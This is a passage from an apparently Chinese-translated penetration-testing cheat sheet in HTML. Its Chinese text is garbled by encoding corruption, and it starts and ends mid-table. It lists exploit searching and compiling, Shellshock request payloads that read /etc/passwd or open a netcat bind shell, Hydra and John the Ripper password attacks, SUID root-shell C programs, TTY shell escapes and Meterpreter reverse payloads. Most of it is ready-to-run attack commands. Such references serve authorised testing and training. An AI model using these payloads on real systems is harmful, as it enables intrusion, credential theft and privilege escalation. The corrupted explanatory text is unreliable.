local`</td><td>‰ªé exploit-dbÊêúÁ¥¢EXP, ËøôÈáå‰ª•WIndows2003Êú¨Âú∞ÊèêÊùÉ‰∏∫‰æã</td></tr><tr><td><code>site:exploit-db.com exploit kernel &lt;= 3</code></td><td>‰ΩøÁî®GoogleÊêúÁ¥¢exploit-db.com</td></tr><tr><td><code>grep -R &quot;W7&quot; /usr/share/metasploit-framework/modules/exploit/windows/*</code></td><td>Áî®grepÊêúÁ¥¢metasploitÁöÑÊ®°Âùó‚Äî‚ÄîÂõ†‰∏∫msfÁöÑÊêúÁ¥¢ÊúâÁÇπÂ∑ÆÂä≤„ÄÇ</td></tr></tbody></table><h3 id="ÊêúÁ¥¢EXP"><a href="#ÊêúÁ¥¢EXP" class="headerlink" title="ÊêúÁ¥¢EXP"></a>ÊêúÁ¥¢EXP</h3><p>ÂÆâË£Öexploit-dbÁöÑÊú¨Âú∞Â§á‰ªΩ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ‚Äìu</span><br><span class="line">searchsploit apache 2.2</span><br><span class="line">searchsploit &quot;Linux Kernel&quot;</span><br><span class="line">searchsploit linux 2.6 | grep -i ubuntu | grep local</span><br></pre></td></tr></table></figure><h3 id="Âú®Kali‰∏äÁºñËØëWIndowsÁöÑexp"><a href="#Âú®Kali‰∏äÁºñËØëWIndowsÁöÑexp" class="headerlink" title="Âú®Kali‰∏äÁºñËØëWIndowsÁöÑexp"></a>Âú®Kali‰∏äÁºñËØëWIndowsÁöÑexp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line">cd /root/.wine/drive_c/windows</span><br><span class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line">cd /root/.wine/drive_c/MinGW/bin</span><br><span class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</span><br><span class="line">wine ability.exe</span><br></pre></td></tr></table></figure><h3 id="‰∫§ÂèâÁºñËØëExploits"><a href="#‰∫§ÂèâÁºñËØëExploits" class="headerlink" title="‰∫§ÂèâÁºñËØëExploits"></a>‰∫§ÂèâÁºñËØëExploits</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 bit)</span><br><span class="line">gcc -m64 -o output hello.c (64 bit)</span><br></pre></td></tr></table></figure><h3 id="Âà©Áî®ÈÄöÁî®ÊºèÊ¥û"><a href="#Âà©Áî®ÈÄöÁî®ÊºèÊ¥û" class="headerlink" title="Âà©Áî®ÈÄöÁî®ÊºèÊ¥û"></a>Âà©Áî®ÈÄöÁî®ÊºèÊ¥û</h3><h4 id="Âà©Áî®ShellshockÊºèÊ¥û"><a href="#Âà©Áî®ShellshockÊºèÊ¥û" class="headerlink" title="Âà©Áî®ShellshockÊºèÊ¥û"></a>Âà©Áî®ShellshockÊºèÊ¥û</h4><p>‰∏Ä‰∏™Áî®Êù•ÂØªÊâæÂíåÂà©Áî®ShellshockÊºèÊ¥ûÁöÑÊîªÂáª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/shocker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H TARGET  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</span><br></pre></td></tr></table></figure><h5 id="cat-file-Êü•ÁúãÊñá‰ª∂ÂÜÖÂÆπ"><a href="#cat-file-Êü•ÁúãÊñá‰ª∂ÂÜÖÂÆπ" class="headerlink" title="cat file (Êü•ÁúãÊñá‰ª∂ÂÜÖÂÆπ)"></a>cat file (Êü•ÁúãÊñá‰ª∂ÂÜÖÂÆπ)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure><h5 id="Shell-Shock-ËøêË°åbind-shell"><a href="#Shell-Shock-ËøêË°åbind-shell" class="headerlink" title="Shell Shock ËøêË°åbind shell"></a>Shell Shock ËøêË°åbind shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure><h5 id="Shell-Shock-ÂèçÂºπshell"><a href="#Shell-Shock-ÂèçÂºπshell" class="headerlink" title="Shell Shock ÂèçÂºπshell"></a>Shell Shock ÂèçÂºπshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 443</span><br></pre></td></tr></table></figure><h2 id="ÁÆÄÂçïÁöÑÊú¨Âú∞WebÊúçÂä°Âô®"><a href="#ÁÆÄÂçïÁöÑÊú¨Âú∞WebÊúçÂä°Âô®" class="headerlink" title="ÁÆÄÂçïÁöÑÊú¨Âú∞WebÊúçÂä°Âô®"></a>ÁÆÄÂçïÁöÑÊú¨Âú∞WebÊúçÂä°Âô®</h2><p>‰ΩøÁî®PythonÂëΩ‰ª§ËøêË°åÊú¨Âú∞WebÊúçÂä°ÔºåÂú®Êé•ÂèóÂèçÂêëshellÂíåÊîªÂáªÁõÆÊ†áÊú∫Âô®ÊòØÂæàÊñπ‰æø„ÄÇ</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>python -m SimpleHTTPServer 80</code></td><td>ËøêË°å‰∏Ä‰∏™Âü∫Êú¨ÁöÑ http ÊúçÂä°,Êé•ÂèóÂèçÂºπshellÁ≠âÊÉÖÂÜµ‰∏ãÂæàÊ£í</td></tr><tr><td><code>python3 -m http.server</code></td><td>ËøêË°å‰∏Ä‰∏™Âü∫Êú¨ÁöÑ Python3 http ÊúçÂä°</td></tr><tr><td><code>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</code></td><td>ËøêË°å‰∏Ä‰∏™Âü∫Êú¨ÁöÑruby http ÊúçÂä°</td></tr><tr><td><code>php -S 0.0.0.0:80</code></td><td>ËøêË°å‰∏Ä‰∏™Âü∫Êú¨ÁöÑ PHP http ÊúçÂä°</td></tr></tbody></table><h2 id="ÊåÇËΩΩÊñá‰ª∂ÂÖ±‰∫´"><a href="#ÊåÇËΩΩÊñá‰ª∂ÂÖ±‰∫´" class="headerlink" title="ÊåÇËΩΩÊñá‰ª∂ÂÖ±‰∫´"></a>ÊåÇËΩΩÊñá‰ª∂ÂÖ±‰∫´</h2><p>ÊÄéÊ†∑ÊåÇËΩΩ NFS / CIFS‰ª•ËøõË°å Windows ÂíåLinux ÁöÑÊñá‰ª∂ÂÖ±‰∫´„ÄÇ</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></td><td>ÊåÇËΩΩNFSÂÖ±‰∫´Âà∞ <code>/mnt/nfs</code></td></tr><tr><td><code>mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs</code></td><td>ÊåÇËΩΩWindows CIFS / SMB ÂÖ±‰∫´Âà∞ Linux ÁöÑ <code>/mnt/cifs</code> „ÄÇÂ¶ÇÊûú‰∏çÁõ¥Êé•Âú®ÂëΩ‰ª§ÈáåÂ∏¶ÂØÜÁ†ÅÔºåÂèØ‰ª•Âú®ËØ¢ÈóÆÂêéËæìÂÖ•ÔºåËøôÊ†∑Â∞±‰∏ç‰ºöÂú®bashÂëΩ‰ª§ÂéÜÂè≤ÈáåÂ≠òÂÇ®ÊòéÊñáÂØÜÁ†Å</td></tr><tr><td><code>net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no</code></td><td>‰ΩøÁî®ÂëΩ‰ª§Ë°åÂú®WindowsÈó¥ÊåÇËΩΩÂÖ±‰∫´Êñá‰ª∂</td></tr><tr><td><code>apt-get install smb4k -y</code></td><td>Âú®Kali‰∏äÂÆâË£Ösmb4kÔºåÊñπ‰æø‰ªéLinuxÁöÑGUIÊü•ÁúãSMBÂÖ±‰∫´</td></tr></tbody></table><h2 id="HTTP-HTTPS-WebÊúçÂä°Êûö‰∏æ"><a href="#HTTP-HTTPS-WebÊúçÂä°Êûö‰∏æ" class="headerlink" title="HTTP / HTTPS WebÊúçÂä°Êûö‰∏æ"></a>HTTP / HTTPS WebÊúçÂä°Êûö‰∏æ</h2><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>nikto -h 192.168.1.1</code></td><td>ÂØπÁõÆÊ†á‰ΩøÁî® nikto ËøõË°åÊâ´Êèè</td></tr><tr><td><code>dirbuster</code></td><td>‰ΩøÁî®GUIÈÖçÁΩÆÔºåÂëΩ‰ª§Ë°å‰∏çÂ•Ω‰Ωø</td></tr></tbody></table><h2 id="Êï∞ÊçÆÂåÖ‰æ¶Êµã"><a href="#Êï∞ÊçÆÂåÖ‰æ¶Êµã" class="headerlink" title="Êï∞ÊçÆÂåÖ‰æ¶Êµã"></a>Êï∞ÊçÆÂåÖ‰æ¶Êµã</h2><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></td><td>Â∞ÜÁΩëÂç°eth0ÁöÑ80Á´ØÂè£ÁöÑÊµÅÈáèÂØºÂá∫Âà∞output.pcap</td></tr></tbody></table><h2 id="Áî®Êà∑ÂêçÊûö‰∏æ"><a href="#Áî®Êà∑ÂêçÊûö‰∏æ" class="headerlink" title="Áî®Êà∑ÂêçÊûö‰∏æ"></a>Áî®Êà∑ÂêçÊûö‰∏æ</h2><p>‰∏Ä‰∫õÁî®Êù•Êûö‰∏æÁõÆÊ†áÁ≥ªÁªüÁî®Êà∑ÂêçÁöÑÊâãÊ≥ï„ÄÇ</p><h3 id="SMB-Áî®Êà∑Êûö‰∏æ"><a href="#SMB-Áî®Êà∑Êûö‰∏æ" class="headerlink" title="SMB Áî®Êà∑Êûö‰∏æ"></a>SMB Áî®Êà∑Êûö‰∏æ</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</code></td><td>Êûö‰∏æSMBÁî®Êà∑</td></tr><tr><td><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></td><td>Âà©Áî®RID cycleÊûö‰∏æSMBÁî®Êà∑</td></tr></tbody></table><h3 id="SNMP-Áî®Êà∑Êûö‰∏æ"><a href="#SNMP-Áî®Êà∑Êûö‰∏æ" class="headerlink" title="SNMP Áî®Êà∑Êûö‰∏æ"></a>SNMP Áî®Êà∑Êûö‰∏æ</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td>`snmpwalk public -v1 192.168.X.XXX 1</td><td>grep 77.1.2.25</td><td>cut -d‚Äù ‚Äú -f4`</td><td>Êûö‰∏æ SNMP Áî®Êà∑</td></tr><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX</code></td><td>Êûö‰∏æ SNMP Áî®Êà∑</td></tr><tr><td><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)</code></td><td>‰ΩøÁî®nmapÊêúÁ¥¢SNMPÊúçÂä°Âô®ÔºåÁÑ∂ÂêéÁî®grepËøáÊª§ËæìÂá∫</td></tr></tbody></table><h2 id="ÂØÜÁ†Å"><a href="#ÂØÜÁ†Å" class="headerlink" title="ÂØÜÁ†Å"></a>ÂØÜÁ†Å</h2><h3 id="Â≠óÂÖ∏"><a href="#Â≠óÂÖ∏" class="headerlink" title="Â≠óÂÖ∏"></a>Â≠óÂÖ∏</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>/usr/share/wordlists</code></td><td>Kali ÁöÑÂ≠óÂÖ∏Â≠òÊîæË∑ØÂæÑ</td></tr></tbody></table><h2 id="ÁàÜÁ†¥ÊúçÂä°"><a href="#ÁàÜÁ†¥ÊúçÂä°" class="headerlink" title="ÁàÜÁ†¥ÊúçÂä°"></a>ÁàÜÁ†¥ÊúçÂä°</h2><h3 id="‰ΩøÁî®Hydra-ÁàÜÁ†¥FTP"><a href="#‰ΩøÁî®Hydra-ÁàÜÁ†¥FTP" class="headerlink" title="‰ΩøÁî®Hydra ÁàÜÁ†¥FTP"></a>‰ΩøÁî®Hydra ÁàÜÁ†¥FTP</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V</code></td><td>‰ΩøÁî®Hydra ÁàÜÁ†¥FTP</td></tr></tbody></table><h3 id="‰ΩøÁî®Hydra-ÁàÜÁ†¥POP3"><a href="#‰ΩøÁî®Hydra-ÁàÜÁ†¥POP3" class="headerlink" title="‰ΩøÁî®Hydra ÁàÜÁ†¥POP3"></a>‰ΩøÁî®Hydra ÁàÜÁ†¥POP3</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V</code></td><td>‰ΩøÁî®Hydra ÁàÜÁ†¥POP3</td></tr></tbody></table><h3 id="‰ΩøÁî®Hydra-ÁàÜÁ†¥SMTP"><a href="#‰ΩøÁî®Hydra-ÁàÜÁ†¥SMTP" class="headerlink" title="‰ΩøÁî®Hydra ÁàÜÁ†¥SMTP"></a>‰ΩøÁî®Hydra ÁàÜÁ†¥SMTP</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></td><td>‰ΩøÁî®Hydra ÁàÜÁ†¥SMTP</td></tr></tbody></table><p>‰ΩøÁî® <code>-t</code> ÈôêÂà∂Âπ∂ÂèëËøûÊé•Êï∞ÔºåÂ¶Ç <code>-t 15</code></p><h2 id="ÂØÜÁ†ÅÁ†¥Ëß£"><a href="#ÂØÜÁ†ÅÁ†¥Ëß£" class="headerlink" title="ÂØÜÁ†ÅÁ†¥Ëß£"></a>ÂØÜÁ†ÅÁ†¥Ëß£</h2><p>Ê∏óÈÄèÊµãËØï‰∏≠Áî®‰∫éÂØÜÁ†ÅÁ†¥Ëß£ÁöÑÂ∑•ÂÖ∑„ÄÇ</p><h3 id="John-The-Ripper-JTR"><a href="#John-The-Ripper-JTR" class="headerlink" title="John The Ripper - JTR"></a>John The Ripper - JTR</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></td><td>JTR Á†¥Ëß£ÂØÜÁ†Å</td></tr><tr><td><code>john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt</code></td><td>JTR ‰ΩøÁî®Â≠óÂÖ∏ÁàÜÁ†¥Ëß£ÂØÜ</td></tr><tr><td><code>john --format=descrypt hash --show</code></td><td>JTR ÁàÜÁ†¥Ëß£ÂØÜ</td></tr></tbody></table><h2 id="Windows-Ê∏óÈÄèÊµãËØïÂëΩ‰ª§"><a href="#Windows-Ê∏óÈÄèÊµãËØïÂëΩ‰ª§" class="headerlink" title="Windows Ê∏óÈÄèÊµãËØïÂëΩ‰ª§"></a>Windows Ê∏óÈÄèÊµãËØïÂëΩ‰ª§</h2><p>See <strong>Windows Penetration Testing Commands</strong>.„ÄêÂæÖÂéüÊñáË°•ÂÖÖ„Äë</p><h2 id="Linux-Ê∏óÈÄèÊµãËØïÂëΩ‰ª§"><a href="#Linux-Ê∏óÈÄèÊµãËØïÂëΩ‰ª§" class="headerlink" title="Linux Ê∏óÈÄèÊµãËØïÂëΩ‰ª§"></a>Linux Ê∏óÈÄèÊµãËØïÂëΩ‰ª§</h2><p>ÂèÇËÄÉÊú¨Á´ôÁöÑ<a href="https://highon.coffee/blog/linux-commands-cheat-sheet/" target="_blank" rel="noopener">Linux ÂëΩ‰ª§ÈÄüÊü•Ë°®</a> ÔºåËØ•Ë°®Êèê‰æõ‰∫ÜÂæàÂ§öÊúâÁî®ÁöÑÂëΩ‰ª§„ÄÇ</p><h2 id="ÁºñËØëEXP"><a href="#ÁºñËØëEXP" class="headerlink" title="ÁºñËØëEXP"></a>ÁºñËØëEXP</h2><p>Some notes on compiling exploits.„ÄêÂæÖÂéüÊñáË°•ÂÖÖ„Äë</p><h3 id="Âà§Êñ≠C‰ª£Á†ÅÈÄÇÁî®‰∫éWindowsÂπ≥Âè∞ËøòÊòØLinux"><a href="#Âà§Êñ≠C‰ª£Á†ÅÈÄÇÁî®‰∫éWindowsÂπ≥Âè∞ËøòÊòØLinux" class="headerlink" title="Âà§Êñ≠C‰ª£Á†ÅÈÄÇÁî®‰∫éWindowsÂπ≥Âè∞ËøòÊòØLinux"></a>Âà§Êñ≠C‰ª£Á†ÅÈÄÇÁî®‰∫éWindowsÂπ≥Âè∞ËøòÊòØLinux</h3><p>ÈÄöËøá<code>#include</code> ÁöÑÊñá‰ª∂Êù•Âà§ÂÆö </p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></td><td>WindowsÂπ≥Âè∞‰ª£Á†Å</td></tr><tr><td><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,  sys/sockt.h, sys/types.h, unistd.h</code></td><td>LinuxÂπ≥Âè∞‰ª£Á†Å</td></tr></tbody></table><h3 id="‰ΩøÁî®GCCÁºñËØëExploit"><a href="#‰ΩøÁî®GCCÁºñËØëExploit" class="headerlink" title="‰ΩøÁî®GCCÁºñËØëExploit"></a>‰ΩøÁî®GCCÁºñËØëExploit</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>gcc -o exploit exploit.c</code></td><td>GCCÂü∫Êú¨Áî®Ê≥ï</td></tr></tbody></table><h3 id="Âú®64‰ΩçÁöÑKali‰∏äÁî®GCCÁºñËØë32‰ΩçÁöÑEXP"><a href="#Âú®64‰ΩçÁöÑKali‰∏äÁî®GCCÁºñËØë32‰ΩçÁöÑEXP" class="headerlink" title="Âú®64‰ΩçÁöÑKali‰∏äÁî®GCCÁºñËØë32‰ΩçÁöÑEXP"></a>Âú®64‰ΩçÁöÑKali‰∏äÁî®GCCÁºñËØë32‰ΩçÁöÑEXP</h3><p>ÂæàÊñπ‰æøÂú∞Âú®64‰ΩçÁöÑÊîªÂáªÊú∫Âô®‰∏ä‰∫§ÂèâÁºñËØë32‰ΩçÁöÑ‰∫åËøõÂà∂Êñá‰ª∂„ÄÇ</p><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>gcc -m32 exploit.c -o exploit</code></td><td>Âú®64‰ΩçÁöÑLinux‰∏ä‰∫§ÂèâÁºñËØë32‰ΩçÁöÑ‰∫åËøõÂà∂Êñá‰ª∂</td></tr></tbody></table><h3 id="Âú®-Linux‰∏äÁºñËØëÂèØËøêË°å‰∫éWindowsÁöÑexeÊñá‰ª∂"><a href="#Âú®-Linux‰∏äÁºñËØëÂèØËøêË°å‰∫éWindowsÁöÑexeÊñá‰ª∂" class="headerlink" title="Âú® Linux‰∏äÁºñËØëÂèØËøêË°å‰∫éWindowsÁöÑexeÊñá‰ª∂"></a>Âú® Linux‰∏äÁºñËØëÂèØËøêË°å‰∫éWindowsÁöÑexeÊñá‰ª∂</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></td><td>Âú® Linux‰∏äÁîüÊàêWindowsÁöÑexe</td></tr></tbody></table><h2 id="SUID-‰∫åËøõÂà∂"><a href="#SUID-‰∫åËøõÂà∂" class="headerlink" title="SUID ‰∫åËøõÂà∂"></a>SUID ‰∫åËøõÂà∂</h2><p>ÈÄöÂ∏∏ÂÖ∑ÊúâSUIDÁöÑ C‰∫åËøõÂà∂Êñá‰ª∂Ë¶ÅÊ±Ç‰ª•Ë∂ÖÁ∫ßÁî®Êà∑ÁôªÈôÜshellÔºåÊÇ®ÂèØ‰ª•ÊåâÈúÄÊõ¥Êñ∞UID / GIDÂíåshell„ÄÇ</p><p>‰∏ãÈù¢ÊòØ‰∏Ä‰∫õÂèØÁî®ÁöÑshellÔºö</p><h3 id="ËøêË°å-bin-bashÁöÑSUID-C-Shell"><a href="#ËøêË°å-bin-bashÁöÑSUID-C-Shell" class="headerlink" title="ËøêË°å /bin/bashÁöÑSUID C Shell"></a>ËøêË°å /bin/bashÁöÑSUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ËøêË°å-bin-shÁöÑSUID-C-Shell"><a href="#ËøêË°å-bin-shÁöÑSUID-C-Shell" class="headerlink" title="ËøêË°å /bin/shÁöÑSUID C Shell"></a>ËøêË°å /bin/shÁöÑSUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ÊûÑÂª∫-SUID-Shell-‰∫åËøõÂà∂"><a href="#ÊûÑÂª∫-SUID-Shell-‰∫åËøõÂà∂" class="headerlink" title="ÊûÑÂª∫ SUID Shell ‰∫åËøõÂà∂"></a>ÊûÑÂª∫ SUID Shell ‰∫åËøõÂà∂</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o suid suid.c</span><br></pre></td></tr></table></figure><p>32‰Ωç</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o suid suid.c</span><br></pre></td></tr></table></figure><h2 id="ÂèçÂêëShells"><a href="#ÂèçÂêëShells" class="headerlink" title="ÂèçÂêëShells"></a>ÂèçÂêëShells</h2><p>ÂèÇËÄÉ <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="noopener">ÂèçÂêë Shell ÈÄüÊü•Ë°®</a> „ÄÇ</p><h2 id="TTY-Shells"><a href="#TTY-Shells" class="headerlink" title="TTY Shells"></a>TTY Shells</h2><p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p><p>‰∏Ä‰∫õÊ®°ÊãüÂá∫TTYÁªàÁ´ØÁ™óÂè£‰ª•Á™ÅÁ†¥shellÈôêÂà∂ÁöÑÊäÄÂ∑ßÔºå‰æø‰∫é‰ªéÂèçÂêëshell‰∏äÊâßË°åÁ±ª‰ºº <code>su</code> ÁöÑÁâπÊÆäÂëΩ‰ª§„ÄÇ</p><h3 id="Áî®PythonÊ®°Êãü-TTY-ShellÁöÑÊäÄÂ∑ß"><a href="#Áî®PythonÊ®°Êãü-TTY-ShellÁöÑÊäÄÂ∑ß" class="headerlink" title="Áî®PythonÊ®°Êãü TTY ShellÁöÑÊäÄÂ∑ß"></a>Áî®PythonÊ®°Êãü TTY ShellÁöÑÊäÄÂ∑ß</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&apos;/bin/bash&apos;)</span><br></pre></td></tr></table></figure><h3 id="Áî®shÊ®°Êãü‰∫§‰∫íÂºèshell"><a href="#Áî®shÊ®°Êãü‰∫§‰∫íÂºèshell" class="headerlink" title="Áî®shÊ®°Êãü‰∫§‰∫íÂºèshell"></a>Áî®shÊ®°Êãü‰∫§‰∫íÂºèshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure><h3 id="Áî®PerlÊ®°Êãü-TTY-Shell"><a href="#Áî®PerlÊ®°Êãü-TTY-Shell" class="headerlink" title="Áî®PerlÊ®°Êãü TTY Shell"></a>Áî®PerlÊ®°Êãü TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;;</span><br><span class="line">perl ‚Äîe &apos;exec &quot;/bin/sh&quot;;&apos;</span><br></pre></td></tr></table></figure><h3 id="Áî®RubyÊ®°Êãü-TTY-Shell"><a href="#Áî®RubyÊ®°Êãü-TTY-Shell" class="headerlink" title="Áî®RubyÊ®°Êãü TTY Shell"></a>Áî®RubyÊ®°Êãü TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><h3 id="Áî®Lua-Ê®°ÊãüTTY-Shell"><a href="#Áî®Lua-Ê®°ÊãüTTY-Shell" class="headerlink" title="Áî®Lua Ê®°ÊãüTTY Shell"></a>Áî®Lua Ê®°ÊãüTTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(&apos;/bin/sh&apos;)</span><br></pre></td></tr></table></figure><h3 id="‰ªéViÊ®°ÊãüTTY-Shell"><a href="#‰ªéViÊ®°ÊãüTTY-Shell" class="headerlink" title="‰ªéViÊ®°ÊãüTTY Shell"></a>‰ªéViÊ®°ÊãüTTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!bash</span><br></pre></td></tr></table></figure><h3 id="Áî®NMAPÊ®°ÊãüTTY-Shell"><a href="#Áî®NMAPÊ®°ÊãüTTY-Shell" class="headerlink" title="Áî®NMAPÊ®°ÊãüTTY Shell"></a>Áî®NMAPÊ®°ÊãüTTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!sh</span><br></pre></td></tr></table></figure><h2 id="Metasploit-ÈÄüÊü•Ë°®"><a href="#Metasploit-ÈÄüÊü•Ë°®" class="headerlink" title="Metasploit ÈÄüÊü•Ë°®"></a>Metasploit ÈÄüÊü•Ë°®</h2><p>ËøôÊòØ‰∏Ä‰∏™metasploitÊñπ‰æøÁöÑÈÄüÊü•ÊâãÂÜå„ÄÇÂÖ≥‰∫éË∑≥ÊùøÊäÄÊúØÂèØÂèÇÁúã <a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" target="_blank" rel="noopener">Meterpreter Pivoting</a> „ÄÇ</p><h3 id="Meterpreter-Payloads"><a href="#Meterpreter-Payloads" class="headerlink" title="Meterpreter Payloads"></a>Meterpreter Payloads</h3><h3 id="Windows-ÂèçÂêëmeterpreter-payload"><a href="#Windows-ÂèçÂêëmeterpreter-payload" class="headerlink" title="Windows ÂèçÂêëmeterpreter payload"></a>Windows ÂèçÂêëmeterpreter payload</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>set payload windows/meterpreter/reverse_tcp</code></td><td>Windows ÂèçÂêëtcp payload</td></tr></tbody></table><h3 id="Windows-VNC-Meterpreter-payload"><a href="#Windows-VNC-Meterpreter-payload" class="headerlink" title="Windows VNC Meterpreter payload"></a>Windows VNC Meterpreter payload</h3><table><thead><tr><th>ÂëΩ‰ª§</th><th>Ëß£Èáä</th></tr></thead><tbody><tr><td><code>set payload windows/vncinject/reverse_tcp`</code>set ViewOnly false`</td><td>Meterpreter 